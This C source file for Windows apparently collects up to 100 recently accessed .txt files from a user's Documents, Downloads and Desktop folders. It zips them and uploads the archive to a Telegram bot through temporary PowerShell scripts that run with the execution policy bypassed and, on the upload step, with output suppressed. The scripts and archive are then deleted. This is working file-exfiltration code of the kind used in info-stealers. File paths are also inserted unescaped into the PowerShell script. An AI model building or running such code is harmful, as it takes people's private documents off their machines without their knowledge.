#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#define MAX_FILES 100
#ifndef MAX_PATH
#define MAX_PATH 1024
#endif
#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
#define CHAT_ID "YOUR_CHAT_ID_HERE"

typedef struct {
    char path[MAX_PATH];
    time_t access_time;
} FileInfo;

// Compare function for qsort (most recent first)
int compare_files(const void *a, const void *b) {
    FileInfo *fa = (FileInfo *)a;
    FileInfo *fb = (FileInfo *)b;
    return (fb->access_time - fa->access_time);
}

// Check if file is a text file
int is_text_file(const char *filename) {
    const char *ext = strrchr(filename, '.');
    if (!ext) return 0;
    
    return (strcmp(ext, ".txt") == 0);
}

// Recursively scan directory for text files
void scan_directory(const char *dir_path, FileInfo *files, int *file_count, int max_files) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;
    
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL && *file_count < max_files * 10) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        
        char full_path[MAX_PATH];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_path, entry->d_name);
        
        struct stat file_stat;
        if (stat(full_path, &file_stat) == -1)
            continue;
        
        if (S_ISDIR(file_stat.st_mode)) {
            // Skip hidden directories and system directories
            if (entry->d_name[0] != '.')
                scan_directory(full_path, files, file_count, max_files);
        } else if (S_ISREG(file_stat.st_mode) && is_text_file(entry->d_name)) {
            if (*file_count < max_files * 10) {
                strncpy(files[*file_count].path, full_path, MAX_PATH - 1);
                files[*file_count].access_time = file_stat.st_atime;
                (*file_count)++;
            }
        }
    }
    closedir(dir);
}

// Find recently accessed text files
int find_recent_text_files(FileInfo *files, int max_files) {
    int file_count = 0;
    
    // Scan common Windows directories
    const char *userprofile = getenv("USERPROFILE");
    if (userprofile) {
        char documents[MAX_PATH];
        snprintf(documents, sizeof(documents), "%s\\Documents", userprofile);
        scan_directory(documents, files, &file_count, max_files);
        
        char downloads[MAX_PATH];
        snprintf(downloads, sizeof(downloads), "%s\\Downloads", userprofile);
        scan_directory(downloads, files, &file_count, max_files);
        
        char desktop[MAX_PATH];
        snprintf(desktop, sizeof(desktop), "%s\\Desktop", userprofile);
        scan_directory(desktop, files, &file_count, max_files);
    }
    
    // Scan current directory
    scan_directory(".", files, &file_count, max_files);
    
    // Sort by access time (most recent first)
    qsort(files, file_count, sizeof(FileInfo), compare_files);
    
    // Return only top MAX_FILES
    return (file_count > max_files) ? max_files : file_count;
}

// Create zip file with the selected files
int create_zip(FileInfo *files, int file_count, const char *zip_name) {
    const char *temp_dir = getenv("TEMP");
    if (!temp_dir) {
        temp_dir = getenv("TMP");
    }
    
    char ps_script[MAX_PATH];
    snprintf(ps_script, sizeof(ps_script), "%s\\compress_files.ps1", temp_dir);
    
    FILE *script = fopen(ps_script, "w");
    if (!script) {
        printf("Error: Cannot create PowerShell script\n");
        return 0;
    }
    
    // Write PowerShell script
    fprintf(script, "$files = @(\n");
    for (int i = 0; i < file_count; i++) {
        fprintf(script, "    '%s'", files[i].path);
        if (i < file_count - 1) {
            fprintf(script, ",\n");
        } else {
            fprintf(script, "\n");
        }
    }
    fprintf(script, ")\n");
    fprintf(script, "Compress-Archive -Path $files -DestinationPath '%s' -Force\n", zip_name);
    fclose(script);
    
    // Execute PowerShell script
    char command[MAX_PATH * 2];
    snprintf(command, sizeof(command), 
             "powershell -ExecutionPolicy Bypass -File \"%s\"", ps_script);
    
    int result = system(command);
    remove(ps_script);
    
    if (result != 0) {
        printf("Error: Failed to create zip file (PowerShell exit code: %d)\n", result);
        printf("Try running PowerShell as administrator or check if files are accessible\n");
        return 0;
    }
    
    printf("✓ Created zip file: %s\n", zip_name);
    return 1;
}

// Send file to Telegram using PowerShell (no curl needed)
int send_to_telegram(const char *file_path, const char *bot_token, const char *chat_id) {
    // Create caption with file info
    struct stat st;
    stat(file_path, &st);
    double size_mb = st.st_size / (1024.0 * 1024.0);
    
    const char *temp_dir = getenv("TEMP");
    if (!temp_dir) {
        temp_dir = getenv("TMP");
    }
    
    char ps_script[MAX_PATH];
    snprintf(ps_script, sizeof(ps_script), "%s\\send_telegram.ps1", temp_dir);
    
    FILE *script = fopen(ps_script, "w");
    if (!script) {
        printf("Error: Cannot create PowerShell script\n");
        return 0;
    }
    
    // Write PowerShell script to send file
    fprintf(script, "$filePath = '%s'\n", file_path);
    fprintf(script, "$botToken = '%s'\n", bot_token);
    fprintf(script, "$chatId = '%s'\n", chat_id);
    fprintf(script, "$caption = '📦 Recent TXT Files Archive`nSize: %.2f MB'\n", size_mb);
    fprintf(script, "$url = \"https://api.telegram.org/bot$botToken/sendDocument\"\n\n");
    fprintf(script, "Add-Type -AssemblyName System.Net.Http\n");
    fprintf(script, "$httpClient = New-Object System.Net.Http.HttpClient\n");
    fprintf(script, "$content = New-Object System.Net.Http.MultipartFormDataContent\n\n");
    fprintf(script, "$fileStream = [System.IO.File]::OpenRead($filePath)\n");
    fprintf(script, "$fileContent = New-Object System.Net.Http.StreamContent($fileStream)\n");
    fprintf(script, "$content.Add($fileContent, 'document', [System.IO.Path]::GetFileName($filePath))\n\n");
    fprintf(script, "$chatIdContent = New-Object System.Net.Http.StringContent($chatId)\n");
    fprintf(script, "$content.Add($chatIdContent, 'chat_id')\n\n");
    fprintf(script, "$captionContent = New-Object System.Net.Http.StringContent($caption)\n");
    fprintf(script, "$content.Add($captionContent, 'caption')\n\n");
    fprintf(script, "try {\n");
    fprintf(script, "    $response = $httpClient.PostAsync($url, $content).Result\n");
    fprintf(script, "    $responseBody = $response.Content.ReadAsStringAsync().Result\n");
    fprintf(script, "    if ($response.IsSuccessStatusCode) {\n");
    fprintf(script, "        exit 0\n");
    fprintf(script, "    } else {\n");
    fprintf(script, "        Write-Host $responseBody\n");
    fprintf(script, "        exit 1\n");
    fprintf(script, "    }\n");
    fprintf(script, "} catch {\n");
    fprintf(script, "    Write-Host \"Error: $_\"\n");
    fprintf(script, "    exit 1\n");
    fprintf(script, "} finally {\n");
    fprintf(script, "    $fileStream.Close()\n");
    fprintf(script, "    $httpClient.Dispose()\n");
    fprintf(script, "}\n");
    fclose(script);
    
    // Execute PowerShell script
    char command[MAX_PATH * 2];
    snprintf(command, sizeof(command), 
             "powershell -ExecutionPolicy Bypass -File \"%s\" >nul 2>&1", ps_script);
    
    printf("Sending to Telegram...\n");
    int result = system(command);
    remove(ps_script);
    
    if (result == 0) {
        printf("✓ File sent successfully to Telegram!\n");
        return 1;
    } else {
        printf("✗ Error sending file to Telegram (exit code: %d)\n", result);
        return 0;
    }
}

int main() {
    printf("=== Recent TXT Files Zipper & Telegram Sender ===\n\n");
    
    // Validate configuration
    if (strcmp(BOT_TOKEN, "YOUR_BOT_TOKEN_HERE") == 0 || 
        strcmp(CHAT_ID, "YOUR_CHAT_ID_HERE") == 0) {
        printf("Error: Please configure BOT_TOKEN and CHAT_ID in the source code\n");
        return 1;
    }
    
    // Allocate memory for file list
    FileInfo *files = malloc(sizeof(FileInfo) * MAX_FILES * 10);
    if (!files) {
        printf("Error: Memory allocation failed\n");
        return 1;
    }
    
    // Find recent text files
    printf("Scanning for recently accessed .txt files...\n");
    int file_count = find_recent_text_files(files, MAX_FILES);
    
    if (file_count == 0) {
        printf("No .txt files found\n");
        free(files);
        return 1;
    }
    
    printf("Found %d recent .txt files\n\n", file_count);
    
    // Display files to be compressed
    printf("Files to be compressed:\n");
    for (int i = 0; i < file_count && i < 10; i++) {
        printf("  %d. %s\n", i + 1, files[i].path);
    }
    if (file_count > 10) {
        printf("  ... and %d more files\n", file_count - 10);
    }
    printf("\n");
    
    // Create zip file in Windows temp folder
    char zip_name[MAX_PATH];
    const char *temp_dir = getenv("TEMP");
    if (!temp_dir) {
        temp_dir = getenv("TMP");
    }
    if (!temp_dir) {
        printf("Error: Cannot find temp directory\n");
        free(files);
        return 1;
    }
    snprintf(zip_name, sizeof(zip_name), "%s\\recent_files.zip", temp_dir);
    
    if (!create_zip(files, file_count, zip_name)) {
        free(files);
        return 1;
    }
    
    // Send to Telegram
    int success = send_to_telegram(zip_name, BOT_TOKEN, CHAT_ID);
    
    // Cleanup
    if (success) {
        printf("\nCleaning up...\n");
        remove(zip_name);
        printf("✓ Temporary zip file removed\n");
    } else {
        printf("\nZip file kept: %s\n", zip_name);
    }
    
    free(files);
    printf("\n✓ Done!\n");
    
    return 0;
}